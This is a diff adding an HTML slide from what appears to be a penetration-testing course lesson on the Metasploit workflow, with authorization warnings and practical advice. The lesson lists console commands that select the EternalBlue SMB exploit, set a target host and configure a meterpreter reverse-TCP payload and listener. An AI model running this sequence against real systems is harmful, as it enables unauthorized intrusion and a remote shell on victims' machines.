@@ -1,0 +1,74 @@
+<div class="h-full w-full flex flex-col p-5 relative overflow-hidden cohortia-bg" data-theme="light">
+  <style>.cohortia-bg{background:#ffffff} pre{white-space:pre-wrap;tab-size:2;font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,monospace}</style>
+  <div class="flex items-center gap-2 text-[10px] font-bold uppercase tracking-wider text-slate-500 mb-4">
+    <span class="px-2 py-1 rounded-md bg-blue-50 text-blue-700 border border-blue-100">Module 8</span>
+    <span>›</span>
+    <span>Chapter 8.3</span>
+    <span>›</span>
+    <span class="text-slate-700">Metasploit Workflow</span>
+  </div>
+
+  <div class="flex gap-6 h-full">
+    <div class="w-1/2 rounded-2xl bg-white p-6 shadow-sm border border-[rgba(226,232,240,0.9)] flex flex-col">
+      <div class="text-xs font-bold uppercase tracking-wider text-slate-500">Code Walkthrough</div>
+      <h2 class="text-xl font-bold text-slate-800 mt-2">Typical command sequence</h2>
+      <p class="text-sm text-slate-600 mt-3">Practice these commands in a lab. Do not run 'exploit' unless you have written authorization.</p>
+
+      <div class="mt-3 rounded-md bg-slate-900 text-white p-3 overflow-auto" style="max-height:40%;">
+        <pre><code># Start Metasploit
+msfconsole
+
+# Search for a candidate exploit
+search eternalblue
+
+# Select an exploit module
+use exploit/windows/smb/ms17_010_eternalblue
+
+# Show options for the selected module
+show options
+
+# Set the target host
+set RHOSTS 192.168.1.101
+
+# Show possible payloads
+show payloads
+
+# Select a payload
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+# Configure listener options
+set LHOST 192.168.1.5
+set LPORT 4444
+
+# Do NOT run 'exploit' in this exercise
+</code></pre>
+      </div>
+
+      <div class="mt-3 text-sm text-slate-600">
+        <div class="font-bold text-slate-800">Explanation</div>
+        <ul class="list-disc ml-5 mt-2 text-sm text-slate-600">
+          <li>Search finds modules indexed by keyword.</li>
+          <li>Use loads a module into the session for inspection.</li>
+          <li>Show options lists required settings you must configure before attempting any action.</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="flex-1 rounded-2xl bg-white p-6 shadow-sm border border-[rgba(226,232,240,0.9)] flex flex-col">
+      <div class="text-sm font-bold text-slate-800">Practical advice</div>
+      <div class="mt-3 text-sm text-slate-600">Always double-check target IPs and network configurations. Use 'check' where supported to validate vulnerability status without executing the exploit. When configuring listeners, ensure network reachability exists between the target and your listener in a lab environment.</div>
+
+      <div class="mt-4">
+        <div class="rounded-xl p-3 bg-amber-50 border border-[rgba(245,166,35,0.12)]">
+          <div class="text-xs font-bold uppercase tracking-wider text-amber-700">Common mistake</div>
+          <div class="text-sm text-slate-700 mt-1">Setting LHOST to an unreachable address or forgetting to scope tests to lab targets, which prevents valid results and may impact production.</div>
+        </div>
+
+        <div class="mt-4 rounded-xl border-l-4 border-l-emerald-500 bg-emerald-50 p-3">
+          <div class="text-[10px] font-bold uppercase tracking-wider text-emerald-700 mb-1">Key Takeaway</div>
+          <p class="text-xs font-medium text-slate-800">The console workflow is predictable: identify modules, inspect options, set targets and payloads, validate, then only exploit with clear authorization.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+<style>pre, code, [class*="code"], [class*="editor"], [class*="snippet"], [class*="source"] { white-space: pre-wrap; tab-size: 2; }</style></div>
